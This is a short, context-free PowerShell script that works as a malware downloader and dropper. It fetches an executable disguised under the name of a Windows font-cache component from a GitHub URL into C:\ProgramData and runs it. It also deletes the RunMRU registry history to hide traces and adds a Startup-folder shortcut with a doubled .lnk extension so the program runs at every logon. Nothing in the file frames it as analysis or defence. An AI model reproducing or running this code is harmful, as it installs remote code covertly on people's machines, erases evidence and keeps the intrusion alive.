Start-Sleep -s 10
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$file_text = "C:\ProgramData\version.txt"
$down.DownloadFile($url_text,$file_text)
$url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
$file = "C:\ProgramData\PresentationFontCache.exe"
$version = Get-Content $file_text
if ($version.Trim() -ne (Invoke-WebRequest $url_text).Content.Trim()) {
    $down.DownloadFile($url,$file)
}
$exec = New-Object -com shell.application
$exec.shellexecute($file)
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
$objShell = New-Object -ComObject ("WScript.Shell")
$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_OTP.lnk.lnk")
$objShortCut.TargetPath="C:\ProgramData\PresentationFontCache.exe"
$objShortCut.Save()
exit
